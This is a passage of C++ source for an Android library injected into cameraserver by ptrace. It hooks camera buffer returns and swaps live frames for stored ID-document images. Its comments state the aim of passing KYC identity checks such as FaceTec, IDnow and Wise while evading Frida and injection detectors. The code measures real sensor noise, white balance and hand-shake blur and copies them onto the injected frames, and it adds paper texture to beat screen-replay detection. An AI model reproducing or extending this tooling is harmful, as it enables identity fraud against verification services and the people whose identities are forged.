// libcam_hook.so — injected into cameraserver via cam_injector (ptrace/dlopen).
// Hooks Camera3OutputStream::returnBuffer and replaces the gralloc dmabuf
// for back-camera streams with the frame from /data/local/tmp/hal_inject/.
//
// No Frida, no Frida strings, no Frida trampolines.
// Detection surface: one custom .so loaded into cameraserver — no known KYC
// SDK scans for arbitrary library names.
//
// Build: native/hook/CMakeLists.txt → libcam_hook.so (arm64-v8a)
// Inject: cam_injector cameraserver /data/local/tmp/hal_inject/libcam_hook.so

#include "inline_hook.h"
#include "imu_shm.h"

#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <stdint.h>
#include <elf.h>
#include <dlfcn.h>
#include <time.h>
#include <android/log.h>

#define TAG  "cam_hook"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN,  TAG, __VA_ARGS__)

#define CTRL_DIR    "/data/local/tmp/hal_inject"
#define CTRL_FILE   CTRL_DIR "/ctrl"
#define CTRL_YUV    CTRL_DIR "/ctrl_yuv"  // contains min YUV width or "0"/absent = disabled
#define CTRL_CAM    CTRL_DIR "/ctrl_cam"  // target facing: "back"(default)/"front"/"both"
#define CUR_CAM     CTRL_DIR "/cur_cam"   // active facing, daemon-written: "back"/"front"
#define CTRL_SLOT   CTRL_DIR "/ctrl_slot" // image slot: "idfront"(default)/"idback"
#define CTRL_FMT    CTRL_DIR "/ctrl_fmt"  // YUV chroma order: "nv21"(default)/"nv12"
#define CTRL_NOISE  CTRL_DIR "/ctrl_noise" // sensor-noise match strength %; absent/"0"=off
#define CTRL_CONTENT_PAD CTRL_DIR "/ctrl_content_pad" // content-PAD strength %; absent/"0"=off. Defeats FaceTec/IDnow "digital screen" detectors by adding paper-fibre micro-texture + sparse laminate specular pinpoints to the injected region. Harmless when the target isn't an IDScan SDK — just a very faint grain.
#define CTRL_COMPOSITE CTRL_DIR "/ctrl_composite" // Step-1 compositor: "1"=region composite, else legacy full-overwrite
#define CTRL_DUMP   CTRL_DIR "/ctrl_dump"  // integer: dump that many POST-composite NV21 frames to CTRL_DIR/dump_<n>.{nv21,dim}, decrement each dump
#define CTRL_SNAP   CTRL_DIR "/snap_yuv"   // "1" = snap next PRE-composite real YUV frame to CTRL_DIR/real_yuv.{nv21,dim}, reset to "0" after save
#define REAL_YUV    CTRL_DIR "/real_yuv.nv21"
#define REAL_DIM    CTRL_DIR "/real_yuv.dim"
#define CTRL_REGION    CTRL_DIR "/ctrl_region"    // document region — two accepted forms:
                                                   //   "cx cy size"   → auto-aspect from source (size = rect H fraction of sensor H)
                                                   //   "cx cy w h"    → manual aspect (normalized w/h of sensor)
                                                   // defaults: "0.5 0.5 0.45" (auto, 45% of sensor height, centered)
#define FRAME_JPEG  CTRL_DIR "/frame.jpg"
#define FRAME_NV21  CTRL_DIR "/frame.nv21"
#define FRAME_DIM   CTRL_DIR "/frame.dim"   // "WxH" of frame.nv21, written by the daemon
// Two ID media slots prepared in Frame Placement; the active one (ctrl_slot) is
// injected. Each falls back to frame.* when its slot file is absent.
#define FRAME_IDF_JPEG CTRL_DIR "/frame_idfront.jpg"
#define FRAME_IDF_NV21 CTRL_DIR "/frame_idfront.nv21"
#define FRAME_IDF_DIM  CTRL_DIR "/frame_idfront.dim"
#define FRAME_IDB_JPEG CTRL_DIR "/frame_idback.jpg"
#define FRAME_IDB_NV21 CTRL_DIR "/frame_idback.nv21"
#define FRAME_IDB_DIM  CTRL_DIR "/frame_idback.dim"
#define STATS_FILE  CTRL_DIR "/stats.json"

// ─── Android camera stream / buffer structs (AOSP android-13 arm64) ───────

struct stream_t {
    int      stream_type;  // 0
    uint32_t width;        // 4
    uint32_t height;       // 8
    int      format;       // 12  BLOB=33, YCbCr_420_888=35, YV12=842094169
    int      data_space;   // 16
    uint32_t usage;        // 20
    uint32_t max_bufs;     // 24
    // Physical camera id follows but varies; we don't need it here.
};

struct native_handle_t {
    int version;  // = sizeof(native_handle_t) = 12
    int numFds;
    int numInts;
    int data[0];  // data[0..numFds-1] = fds; data[numFds..] = ints
};

struct cam_stream_buf {
    stream_t         *stream;        // offset  0
    native_handle_t **buffer;        // offset  8
    int               status;        // offset 16
    int               acquire_fence; // offset 20
    int               release_fence; // offset 24
    int               pad;           // offset 28
};

// ─── Global state ─────────────────────────────────────────────────────────

static void  *g_trampoline    = nullptr;
static uint64_t g_inject_count = 0;

// ─── Step 2: CaptureResult metadata ring ──────────────────────────────────
// Populated by hook_send_capture_result on every real CameraMetadata the
// device assembles. The compositor reads the entry matching the frame it
// is about to overwrite, so brightness / white-balance / noise match the
// REAL ambient for that exact frame instead of a coarse spatial estimate.
//
// Lock-free seqlock: writer bumps `seq` to odd before writing, back to even
// after. Readers retry while seq is odd or changes mid-read.
struct FrameMeta {
    uint32_t         frame_number;    // Camera2 CaptureResult.frameNumber
    uint64_t         timestamp_ns;    // ANDROID_SENSOR_TIMESTAMP (monotonic)
    uint64_t         exposure_ns;     // ANDROID_SENSOR_EXPOSURE_TIME
    uint32_t         iso;             // ANDROID_SENSOR_SENSITIVITY
    float            awb_gains[4];    // ANDROID_COLOR_CORRECTION_GAINS: R, G_even, G_odd, B
                                       // (or diagonal of COLOR_CORRECTION_TRANSFORM — pseudo-gains)
    float            ccm[9];          // ANDROID_COLOR_CORRECTION_TRANSFORM row-major 3×3
    float            focal_length_mm; // ANDROID_LENS_FOCAL_LENGTH — per-frame focal length
    uint32_t         valid_mask;      // bit0=ts bit1=exp bit2=iso bit3=awb bit4=focal bit5=ccm
    volatile uint32_t seq;            // seqlock counter
};
static FrameMeta g_frame_meta_ring[64] = {};

static inline FrameMeta *meta_slot(uint32_t fn) { return &g_frame_meta_ring[fn & 63]; }

// Seqlock reader: returns true iff slot holds a consistent snapshot for `fn`.
// Retries while writer has it open (seq odd) or seq changes mid-read; bounded.
static bool read_meta(uint32_t fn, FrameMeta *out) {
    FrameMeta *s = meta_slot(fn);
    for (int tries = 0; tries < 4; tries++) {
        uint32_t s1 = s->seq;
        if (s1 & 1u) continue;                    // writer in progress
        __asm__ volatile("dmb ish" ::: "memory");
        FrameMeta snap = *s;                       // copy fields
        __asm__ volatile("dmb ish" ::: "memory");
        uint32_t s2 = s->seq;
        if (s1 == s2 && snap.frame_number == fn) { *out = snap; return true; }
    }
    return false;
}

static void *g_scr_trampoline = nullptr;

// ─── Step 3: gyro shared-memory ring (daemon writer → hook reader) ────────
// The daemon samples the Android gyroscope at ~200 Hz and writes CLOCK_BOOTTIME-
// timestamped rad/s samples into /data/local/tmp/hal_inject/imu.shm (fixed
// IMU_SHM_SIZE). We mmap it read-only once at hook init. imu_window() slices
// the samples whose timestamps fall inside a shutter interval, giving Step 4
// the motion history it needs to compute a per-frame PSF.
static const ImuShmHeader *g_imu_hdr  = nullptr;
static const ImuSample    *g_imu_ring = nullptr;

static bool imu_open() {
    int fd = open("/data/local/tmp/hal_inject/imu.shm", O_RDONLY);
    if (fd < 0) return false;
    void *p = mmap(nullptr, IMU_SHM_SIZE, PROT_READ, MAP_SHARED, fd, 0);
    close(fd);
    if (p == MAP_FAILED) return false;
    const ImuShmHeader *h = (const ImuShmHeader *)p;
    if (h->magic != IMU_SHM_MAGIC || h->stride != sizeof(ImuSample) ||
        h->ring_count != IMU_RING_COUNT) {
        munmap(p, IMU_SHM_SIZE);
        LOGW("imu_open: bad header magic=0x%x stride=%u count=%u",
             h->magic, h->stride, h->ring_count);
        return false;
    }
    g_imu_hdr  = h;
    g_imu_ring = (const ImuSample *)((const uint8_t *)p + sizeof(ImuShmHeader));
    LOGD("imu_open: mapped RO, rate=%u Hz", h->sample_rate_hz);
    return true;
}

// Slice samples whose ts_ns ∈ [t0, t1] into `out[0..cap-1]`. Returns the
// count filled (<= cap). Caller may pass out=nullptr/cap=0 just to count.
// We snapshot `head` once, then read backward until the timestamp falls
// below t0 or we exceed the ring. Writer's seqlock lets us retry if torn.
// This is called from returnBuffer (frequently hot) — keep it short.
static int imu_window(uint64_t t0, uint64_t t1, ImuSample *out, int cap) {
    if (!g_imu_hdr || t1 < t0) return 0;
    for (int attempt = 0; attempt < 3; attempt++) {
        uint32_t s0 = g_imu_hdr->seq;
        if (s0 & 1u) continue;                 // writer in progress
        uint32_t head = g_imu_hdr->head;
        __asm__ volatile("dmb ish" ::: "memory");

        int n = 0;
        // Walk backward from newest; collect in-range samples, newest-first.
        for (uint32_t k = 0; k < IMU_RING_COUNT && n < cap; k++) {
            uint32_t idx = (head - 1 - k) % IMU_RING_COUNT;
            uint64_t ts = g_imu_ring[idx].ts_ns;
            if (ts == 0) break;                // never written this slot
            if (ts > t1) continue;             // too new — rare edge
            if (ts < t0) break;                // past the window
            if (out) out[n] = g_imu_ring[idx];
            n++;
        }

        __asm__ volatile("dmb ish" ::: "memory");
        uint32_t s1 = g_imu_hdr->seq;
        if (s0 == s1) return n;                // consistent — done
    }
    return 0;                                   // gave up — writer too busy
}

// ─── Step 4: pixel displacement from gyro (motion-blur PSF kernel direction) ─
//
// For an exposure interval [t_start,t_end] at sensor width `src_w`, compute
// the image-plane pixel displacement (dx, dy) produced by hand shake during
// that shutter. Small-angle approximation:
//
//   d = f_px * avg_ω * T          (T = exposure sec, f_px = focal pixels)
//
// Android sensor coord system on back cam (phone held naturally):
//   X-axis = across screen, Y-axis = up screen, Z-axis = out of screen
//   Rotation about X (pitch) → image shifts VERTICALLY   (±dy)
//   Rotation about Y (yaw)   → image shifts HORIZONTALLY (±dx)
//   Rotation about Z (roll)  → image ROTATES (ignored for a translation PSF)
//
// Focal pixels: if focal_length_mm is known (Step 2 extracted LENS_FOCAL_LENGTH
// from this frame's metadata), compute per-frame:  f_px = src_w · focal / sensor_w
// Otherwise fall back to the Pixel-7a-main-cam-pinned hfov of 81° via its
// precomputed tan(hfov/2) ≈ 0.854. This matters when the stream swaps between
// main cam and ultra-wide (focal drops from 4.38 mm to ~1.58 mm → hfov jumps
// from 81° to ~115°, and pixel-displacement per rad of rotation shrinks by 2.8×).
static const float HALF_HFOV_TAN_FALLBACK = 0.854f;

// ── Exact ISP color-match: WB·CCM composed as a YUV→YUV 3×3 matrix (Q10) ─
// The camera applies  sRGB = CCM · WB_diag · raw_RGB  to turn the raw sensor
// response into display RGB. Our source is already in "generic sRGB", so to
// make it look like it went through THIS camera's pipeline we apply the same
// CCM·WB chain to the source's RGB (then convert back to YUV).
//
// For NV21/NV12 chroma-plane work we skip RGB entirely by precomposing the
// whole chain as a single YUV→YUV matrix:
//
//   M_total = Mat_RGB2YUV · CCM · diag(Rg, Gavg, Bg) · Mat_YUV2RGB
//
// Then per chroma pixel: (Y, Uc, Vc) → M_total · (Y, Uc, Vc). We only read Y
// (from the just-composited dst luma) and write new chroma — luma is already
// handled by the ambient-mean scale, and CCM's effect on luma is small (<1%
// in the diagonal for well-balanced white).
//
// Q10 scaling: typical matrix entries live in [-2..2], so Q10 = ×1024 fits
// in int16 comfortably and the per-pixel multiply stays in int32 range even
// when Y hits 255.
//
// BT.601 full-range YUV↔RGB:
//   R = Y            + 1.402·Vc
//   G = Y − 0.344·Uc − 0.714·Vc
//   B = Y + 1.772·Uc
//   Y = 0.299·R + 0.587·G + 0.114·B
//   Uc = −0.169·R − 0.331·G + 0.500·B
//   Vc =  0.500·R − 0.419·G − 0.081·B

// Compose (Mat_RGB2YUV · CCM · diag_WB · Mat_YUV2RGB) → 9 Q10 ints in m_out.
// Pass ccm == nullptr to use identity CCM (gains-only path).
static void compose_color_matrix_q10(const float gains[4], const float *ccm,
                                     int32_t m_out[9]) {
    // 1) Mat_YUV2RGB (3×3)
    static const float YUV2RGB[9] = {
        1.0f,  0.0f,     1.402f,
        1.0f, -0.344f,  -0.714f,
        1.0f,  1.772f,   0.0f
    };
    // 2) Diag_WB (3×3)
    float Rg = gains[0], Gg = 0.5f * (gains[1] + gains[2]), Bg = gains[3];
    if (Rg < 0.1f) Rg = 1.0f;
    if (Gg < 0.1f) Gg = 1.0f;
    if (Bg < 0.1f) Bg = 1.0f;
    // 3) CCM (3×3). Identity if caller passed nullptr.
    float id[9] = {1,0,0, 0,1,0, 0,0,1};
    const float *C = ccm ? ccm : id;
    // 4) Mat_RGB2YUV (3×3)
    static const float RGB2YUV[9] = {
         0.299f,  0.587f,  0.114f,
        -0.169f, -0.331f,  0.500f,
         0.500f, -0.419f, -0.081f
    };
    // A = Diag_WB · YUV2RGB (row-wise: scale each row of YUV2RGB by its gain)
    float A[9];
    A[0] = Rg * YUV2RGB[0]; A[1] = Rg * YUV2RGB[1]; A[2] = Rg * YUV2RGB[2];
    A[3] = Gg * YUV2RGB[3]; A[4] = Gg * YUV2RGB[4]; A[5] = Gg * YUV2RGB[5];
    A[6] = Bg * YUV2RGB[6]; A[7] = Bg * YUV2RGB[7]; A[8] = Bg * YUV2RGB[8];
    // B = CCM · A
    float B[9];
    for (int r = 0; r < 3; r++) {
        for (int c = 0; c < 3; c++) {
            B[r*3+c] = C[r*3+0]*A[0*3+c] + C[r*3+1]*A[1*3+c] + C[r*3+2]*A[2*3+c];
        }
    }
    // M = RGB2YUV · B
    for (int r = 0; r < 3; r++) {
        for (int c = 0; c < 3; c++) {
            float v = RGB2YUV[r*3+0]*B[0*3+c] + RGB2YUV[r*3+1]*B[1*3+c] + RGB2YUV[r*3+2]*B[2*3+c];
            // Q10 round → int32
            float q = v * 1024.0f;
            if (q >  32000.f) q =  32000.f;
            if (q < -32000.f) q = -32000.f;
            m_out[r*3+c] = (int32_t)(q + (q >= 0 ? 0.5f : -0.5f));
        }
    }
}

// Pixel 7a main back camera sensor physical width (Sony IMX787): 7.564 mm.
// Used with the per-frame focal_length_mm (Step-2 extracted) to derive
// f_px = src_w · focal / sensor_w. Follow-up: read SENSOR_INFO_PHYSICAL_SIZE
// from CameraCharacteristics at startup so swapping to ultra-wide works too.
#define SENSOR_WIDTH_MM 7.564f

static inline float fabs_fast(float x) { return x < 0 ? -x : x; }

// Motion-descriptor used by Step-4 blur and P1 rolling-shutter shear.
struct MotionParams {
    float dx_blur;   // horizontal pixel shift INTEGRATED over exposure T (blur length)
    float dy_blur;   // vertical pixel shift   INTEGRATED over exposure T
    float wx;        // mean pitch angular velocity, rad/s (vertical image shift per sec)
    float wy;        // mean yaw   angular velocity, rad/s (horizontal image shift per sec)
    float f_px;      // pixel focal length at this stream width
    bool  worth_blur;// |d_blur| ≥ 0.5 px — blur worth applying
    bool  any_motion;// any samples collected — rolling-shutter shear worth applying
};

// Fill `*mp` from gyro window + optional per-frame focal length. Returns true
// if samples were available (shear/blur usable); checks for individual
// significance via mp->worth_blur and |mp->wy / wx| thresholds elsewhere.
static bool compute_motion(uint64_t t_start, uint64_t t_end,
                           int src_w, float focal_length_mm,
                           MotionParams *mp) {
    *mp = {};
    if (!g_imu_hdr || t_end <= t_start) return false;
    ImuSample win[32];
    int n = imu_window(t_start, t_end, win, 32);
    if (n < 2) return false;

    float wx = 0.f, wy = 0.f;
    for (int i = 0; i < n; i++) { wx += win[i].x; wy += win[i].y; }
    wx /= n; wy /= n;

    float T = (t_end - t_start) * 1e-9f;
    float f_px = (focal_length_mm > 0.1f)
        ? ((float)src_w * focal_length_mm / SENSOR_WIDTH_MM)
        : ((float)src_w * 0.5f / HALF_HFOV_TAN_FALLBACK);

    mp->wx = wx; mp->wy = wy;
    mp->f_px = f_px;
    mp->dx_blur = f_px * wy * T;
    mp->dy_blur = f_px * wx * T;
    mp->any_motion = true;
    mp->worth_blur = (mp->dx_blur * mp->dx_blur + mp->dy_blur * mp->dy_blur) >= 0.25f;
    return true;
}

// Thin shim kept for the existing Step-4 call site — forwards to compute_motion.
static bool compute_pixel_displacement(uint64_t t_start, uint64_t t_end,
                                       int src_w, float focal_length_mm,
                                       float *dx_out, float *dy_out) {
    MotionParams mp;
    if (!compute_motion(t_start, t_end, src_w, focal_length_mm, &mp)) return false;
    *dx_out = mp.dx_blur; *dy_out = mp.dy_blur;
    return mp.worth_blur;
}

// Lazy-resolved camera_metadata C API (from libcamera_metadata.so, already
// loaded by cameraserver). Signatures from system/media/camera/include/system/.
typedef struct camera_metadata camera_metadata_t;

// Minimal mirror of Android's camera_metadata_entry_t (from system/camera_metadata.h).
// Layout is stable across Android 10+.
typedef struct camera_metadata_entry {
    uint32_t tag;
    uint8_t  type;
    uint32_t count;
    union {
        uint8_t  *u8;
        int32_t  *i32;
        float    *f;
        int64_t  *i64;
        double   *d;
    } data;
    size_t   data_size;
} camera_metadata_entry_t;
// Matches AOSP's camera_metadata_ro_entry_t exactly:
//   system/media/camera/include/system/camera_metadata.h
//   size_t index; uint32_t tag; uint8_t type; size_t count; union { ... } data;
// On arm64 size_t is 8 bytes, so the struct is 40 B with natural padding.
struct cm_ro_entry {
    size_t   index;
    uint32_t tag;
    uint8_t  type;
    size_t   count;
    union {
        const uint8_t  *u8;
        const int32_t  *i32;
        const float    *f;
        const int64_t  *i64;
        const double   *d;
        const void     *raw;
    } data;
};
typedef int (*find_ro_t)(const camera_metadata_t *, uint32_t, cm_ro_entry *);
static find_ro_t g_find_ro = nullptr;

// Camera metadata tag ids (from system/media/camera/include/system/camera_metadata_tags.h).
// Section ANDROID_SENSOR = 14 → base 0xE0000; ANDROID_COLOR_CORRECTION = 0 → base 0.
static const uint32_t TAG_EXPOSURE_TIME     = 0x000E0000u; // ANDROID_SENSOR_EXPOSURE_TIME
static const uint32_t TAG_SENSITIVITY       = 0x000E0002u; // ANDROID_SENSOR_SENSITIVITY
static const uint32_t TAG_SENSOR_TIMESTAMP  = 0x000E0010u; // ANDROID_SENSOR_TIMESTAMP
static const uint32_t TAG_CC_GAINS          = 0x00000002u; // ANDROID_COLOR_CORRECTION_GAINS
static const uint32_t TAG_CC_TRANSFORM      = 0x00000001u; // ANDROID_COLOR_CORRECTION_TRANSFORM (3x3 rational)
static const uint32_t TAG_LENS_FOCAL_LEN    = 0x00080002u; // ANDROID_LENS_FOCAL_LENGTH (float mm)

// camera_metadata_rational_t — 3x3 color-correction transform is 9 of these.
struct camera_metadata_rational { int32_t numerator; int32_t denominator; };
// SENSOR_WIDTH_MM defined earlier (near compute_pixel_displacement).

// ─── Helpers ──────────────────────────────────────────────────────────────

static bool inject_enabled() {
    char buf[8] = {};
    int fd = open(CTRL_FILE, O_RDONLY);
    if (fd < 0) return false;
    ssize_t r = read(fd, buf, 4);
    close(fd);
    return r >= 2 && buf[0] == 'o' && buf[1] == 'n';
}

// Returns the minimum YUV stream width that should be injected, or 0 if YUV
// injection is disabled.  Write a decimal number to CTRL_YUV to enable;
// absent file or "0" = disabled.  BLOB streams are never gated by this.
static uint32_t yuv_min_width() {
    char buf[16] = {};
    int fd = open(CTRL_YUV, O_RDONLY);
    if (fd < 0) return 0;
    ssize_t r = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (r <= 0) return 0;
    return (uint32_t)atoi(buf);
}

// Read one of the "back"/"front"/"both" facing files. Returns:
//   0 = back, 1 = front, 2 = both, def = fallback when absent/unreadable.
static int read_facing(const char *path, int def) {
    char b[8] = {};
    int fd = open(path, O_RDONLY);
    if (fd < 0) return def;
    ssize_t r = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (r <= 0) return def;
    if (b[0] == 'f') return 1;                 // front
    if (b[0] == 'b' && b[1] == 'o') return 2;  // both
    if (b[0] == 'b') return 0;                 // back
    return def;
}

// Which facing to inject (user target). Default back → front passes through.
static int cam_target()  { return read_facing(CTRL_CAM, 0); }
// Which camera is currently streaming (daemon-written); -1 if unknown.
static int cam_current() { return read_facing(CUR_CAM, -1); }

// Active ID media slot: 0 = idfront, 1 = idback. Toggled on-device by a
// volume-DOWN double-press. Default idfront.
static int cam_slot() {
    char b[12] = {};
    int fd = open(CTRL_SLOT, O_RDONLY);
    if (fd < 0) return 0;
    ssize_t r = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (r <= 0) return 0;
    return strstr(b, "back") ? 1 : 0;   // "idback" -> 1, else idfront
}

// Chroma order to inject: 0 = NV21 (V,U — default), 1 = NV12 (U,V).
static int yuv_fmt() {
    char b[8] = {};
    int fd = open(CTRL_FMT, O_RDONLY);
    if (fd < 0) return 0;
    ssize_t r = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (r <= 0) return 0;
    return strstr(b, "12") ? 1 : 0;   // "nv12" -> 1
}

// BLOB (JPEG) source for the active slot; falls back to frame.jpg.
static const char *slot_jpeg() {
    if (cam_slot() == 1) return access(FRAME_IDB_JPEG, R_OK) == 0 ? FRAME_IDB_JPEG : FRAME_JPEG;
    return access(FRAME_IDF_JPEG, R_OK) == 0 ? FRAME_IDF_JPEG : FRAME_JPEG;
}

// Fill yuv/dim with the raw-YUV source paths for the active slot and chroma
// order. Thread-safe: writes into caller-provided buffers (returnBuffer runs on
// several camera threads). Falls back to frame.<ext> + frame.dim.
static void slot_yuv_paths(char *yuv, char *dim, size_t n) {
    const char *ext  = yuv_fmt() ? "nv12" : "nv21";
    const char *base = (cam_slot() == 1) ? CTRL_DIR "/frame_idback"
                                         : CTRL_DIR "/frame_idfront";
    snprintf(yuv, n, "%s.%s", base, ext);
    if (access(yuv, R_OK) == 0) { snprintf(dim, n, "%s.dim", base); return; }
    snprintf(yuv, n, CTRL_DIR "/frame.%s", ext);
    snprintf(dim, n, "%s", FRAME_DIM);
}

static void bump_stats() {
    ++g_inject_count;
    char tmp[128];
    snprintf(tmp, sizeof(tmp),
             "{\"frames\":%llu,\"active\":true}\n",
             (unsigned long long)g_inject_count);
    int fd = open(STATS_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0) { write(fd, tmp, strlen(tmp)); close(fd); }
}

// camera3 JPEG transport trailer (hardware/libhardware/include/.../camera3.h).
// The consumer reads jpeg_size from this trailer at the END of the gralloc
// buffer to size the JPEG, so after overwriting a BLOB buffer we MUST rewrite
// it or the delivered frame is truncated/garbage.
#define CAMERA3_JPEG_BLOB_ID 0x00FF
struct camera3_jpeg_blob {
    uint16_t jpeg_blob_id;
    uint32_t jpeg_size;
};

// True size of a dma-buf fd (dma-buf supports SEEK_END). 0 on failure.
static size_t dmabuf_size(int fd) {
    off_t end = lseek(fd, 0, SEEK_END);
    if (end <= 0) return 0;
    lseek(fd, 0, SEEK_SET);
    return (size_t)end;
}

// Source NV21 dimensions from a "WxH" sidecar file; 0 if absent.
static void read_nv21_dim(const char *path, uint32_t *w, uint32_t *h) {
    *w = 0; *h = 0;
    int fd = open(path, O_RDONLY);
    if (fd < 0) return;
    char buf[32] = {};
    ssize_t r = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (r <= 0) return;
    sscanf(buf, "%ux%u", w, h);
}

#include "jpeg_rescale.h"

// Read ctrl_blob_res_w / _h; return 0 (use stream dims) if absent. Lets the
// user override the auto-match via the app's "Res" button.
static void read_blob_res_override(int *ow, int *oh) {
    *ow = 0; *oh = 0;
    int fdw = open(CTRL_DIR "/ctrl_blob_res_w", O_RDONLY);
    if (fdw >= 0) { char b[16]={}; read(fdw,b,sizeof(b)-1); close(fdw); *ow = atoi(b); }
    int fdh = open(CTRL_DIR "/ctrl_blob_res_h", O_RDONLY);
    if (fdh >= 0) { char b[16]={}; read(fdh,b,sizeof(b)-1); close(fdh); *oh = atoi(b); }
}

// BLOB still-capture: rescale the stored slot JPEG to match (stream_w ×
// stream_h) negotiated by the KYC app, then write at offset 0 and rewrite
// the transport trailer at the end of the gralloc buffer so the consumer
// reads OUR length.
//
// Why rescale matters: a JPEG is self-describing (SOF marker encodes W×H).
// CameraX pipes the BLOB through `JpegBytes2CroppedBitmap.decodeRegion(
// cropRect = stream_w × stream_h)`; if we drop a 1920×1080 JPEG into a
// 2000×1500 stream the crop falls off the decoded bitmap's edge and the
// KYC app gets a black / mis-aspect region. Rescaling to the exact stream
// dims makes injection "just work" against FaceTec IDScan / Wise / any
// KYC that negotiates ≠ our default Res.
//
// Override: if the user picked a specific Res (ctrl_blob_res_w/h present and
// non-zero), use that instead of stream_w/h — some SDKs reject mismatched
// aspect even when dims are "right", and this lets the user force the one
// the backend accepts.
static void write_blob(int dmabuf_fd, const char *jpeg_path,
                       int stream_w, int stream_h) {
    size_t buf_size = dmabuf_size(dmabuf_fd);
    if (buf_size == 0) { LOGW("write_blob: dmabuf_size=0 fd=%d", dmabuf_fd); return; }

    // Pick target dims: user override > stream dims. Fall through to raw-copy
    // (legacy behaviour) only if both are zero AND stored JPEG fits.
    int target_w = 0, target_h = 0;
    read_blob_res_override(&target_w, &target_h);
    if (target_w <= 0 || target_h <= 0) { target_w = stream_w; target_h = stream_h; }

    uint8_t *enc = nullptr;
    size_t  enc_len = 0;
    bool    enc_owned = false;
    uint8_t *src = nullptr;
    size_t  src_len = 0;

    if (target_w > 0 && target_h > 0) {
        int rc = jpeg_rescale_file_to_mem(jpeg_path, target_w, target_h, 92,
                                          &enc, &enc_len);
        if (rc == 0 && enc && enc_len > 0) {
            enc_owned = true;
            LOGD("write_blob RESCALE: src=%s → %dx%d jpeg=%zu B",
                 jpeg_path, target_w, target_h, enc_len);
        } else {
            LOGW("write_blob: rescale failed rc=%d, falling back to raw copy", rc);
            enc = nullptr;
        }
    }

    // Fallback: raw-copy (prior behaviour). Only hit if rescale failed or we
    // had no target dims at all.
    if (!enc) {
        int sfd = open(jpeg_path, O_RDONLY);
        if (sfd < 0) { LOGW("write_blob: open(%s) failed: %s", jpeg_path, strerror(errno)); return; }
        struct stat st;
        if (fstat(sfd, &st) != 0 || st.st_size <= 0) {
            LOGW("write_blob: fstat/empty %s", jpeg_path); close(sfd); return;
        }
        src_len = (size_t)st.st_size;
        src = (uint8_t *)mmap(NULL, src_len, PROT_READ, MAP_PRIVATE, sfd, 0);
        close(sfd);
        if (src == MAP_FAILED) { LOGW("write_blob: mmap src failed"); return; }
        enc = src; enc_len = src_len; enc_owned = false;
    }

    void *dst = mmap(NULL, buf_size, PROT_READ | PROT_WRITE, MAP_SHARED, dmabuf_fd, 0);
    if (dst != MAP_FAILED) {
        size_t copy = enc_len < buf_size ? enc_len : buf_size;
        memcpy(dst, enc, copy);
        if (buf_size >= sizeof(camera3_jpeg_blob)) {
            auto *tr = (camera3_jpeg_blob *)((uint8_t *)dst + buf_size - sizeof(camera3_jpeg_blob));
            tr->jpeg_blob_id = CAMERA3_JPEG_BLOB_ID;
            tr->jpeg_size    = (uint32_t)copy;
        }
        munmap(dst, buf_size);
        LOGD("write_blob OK: fd=%d jpeg_len=%zu buf_size=%zu copy=%zu path=%s target=%dx%d",
             dmabuf_fd, enc_len, buf_size, copy, jpeg_path, target_w, target_h);
    } else {
        LOGW("write_blob: mmap dst failed fd=%d buf_size=%zu: %s", dmabuf_fd, buf_size, strerror(errno));
    }
    if (enc_owned) free(enc);
    if (src)       munmap(src, src_len);
}

// Recover the real Y row stride from the gralloc buffer handle's int fields.
// The layout is vendor-specific, so instead of hardcoding an offset we look for
// a value that is a plausible row stride (>= width, within alignment padding,
// 16-byte aligned) AND whose stride*height also appears as a plane-size int.
// Returns 0 if nothing convincing is found (caller then estimates from size).
static uint32_t gralloc_row_stride(native_handle_t *nh, uint32_t w, uint32_t h) {
    if (!nh || nh->numInts <= 0) return 0;
    const int *ints = &nh->data[nh->numFds];
    int n = nh->numInts;
    for (int i = 0; i < n; i++) {
        uint32_t s = (uint32_t)ints[i];
        if (s < w || s > w + 512 || (s & 15)) continue;
        uint64_t plane = (uint64_t)s * h;
        for (int j = 0; j < n; j++)
            if ((uint32_t)ints[j] == (uint32_t)plane) return s;
    }
    return 0;
}

// ── Sensor-noise realism (YUV path) ──────────────────────────────────────────
// The injected frame is otherwise suspiciously CLEAN: a real sensor leaves shot+
// read noise in every frame, and injection detectors flag the "missing noise
// fingerprint". Because the hook runs at returnBuffer AFTER the real sensor has
// streamed this buffer up through the genuine V4L2/kernel path, the dst dmabuf
// still holds the REAL frame when we map it — so we MEASURE its live noise sigma,
// then overwrite the content but reintroduce matched, per-frame-varying grain.
// Pure in-HAL-buffer operation: real STREAMON/QBUF/DQBUF flow is untouched.
// Gated by ctrl_noise (percent; absent/"0" = off → original clean behaviour).

static int noise_strength() {
    char b[8] = {};
    int fd = open(CTRL_NOISE, O_RDONLY);
    if (fd < 0) return 0;
    ssize_t r = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (r <= 0) return 0;
    return atoi(b);                 // 0 = off, 100 = 1.0x matched, >100 = exaggerate
}

// Forward decl so content_pad_strength() can be read early; the real
// apply_content_pad body is defined below DocRect (near line 990) because
// its body dereferences R.x0..y1 and needs the full struct.
struct DocRect;
static void apply_content_pad(uint8_t *dy, uint32_t dst_stride,
                              const DocRect &R, uint32_t &rng, int strength);

// Percent (0..200). Absent/"0" = off; typical "match real paper" setting is
// ~50. Drives apply_content_pad() below.
static int content_pad_strength() {
    char b[8] = {};
    int fd = open(CTRL_CONTENT_PAD, O_RDONLY);
    if (fd < 0) return 0;
    ssize_t r = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (r <= 0) return 0;
    return atoi(b);
}

static inline uint32_t xr(uint32_t &s) { s ^= s << 13; s ^= s >> 17; s ^= s << 5; return s; }
static inline int clamp255(int v) { return v < 0 ? 0 : (v > 255 ? 255 : v); }

// Cheap ~N(0,sigma): sum of three uniform bytes (CLT), centred and normalised
// (std of sum-of-3 U[0,255] = 127.5). Four PRNG draws/pixel, no float div in LUT.
static inline int nz(uint32_t &rng, float sigma) {
    if (sigma <= 0.f) return 0;
    int s = (int)(xr(rng) >> 24) + (int)(xr(rng) >> 24) + (int)(xr(rng) >> 24) - 382;
